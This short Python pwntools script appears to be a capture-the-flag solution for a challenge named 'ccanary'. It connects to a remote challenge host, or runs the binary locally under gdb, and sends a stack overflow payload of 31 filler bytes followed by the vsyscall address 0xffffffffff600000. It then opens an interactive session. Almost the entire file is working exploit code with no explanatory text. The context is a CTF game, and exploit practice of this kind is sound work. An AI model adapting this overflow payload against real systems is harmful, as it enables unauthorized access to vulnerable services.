from pwn import *
import sys

if sys.argv[1] == "r":
    p = remote("7b00000027b27aadee65484f-ccanary.challenge.master.allesctf.net", 31337, ssl=True)
elif sys.argv[1] == "l":
    p = process("./ccanary")
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, gdbscript='''
                            pie breakpoint *0x132c
                            continue
                            ''')
def solve():
    payload = "A"*31 + p64(0xffffffffff600000)
    print p.recv(timeout=2)
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    solve()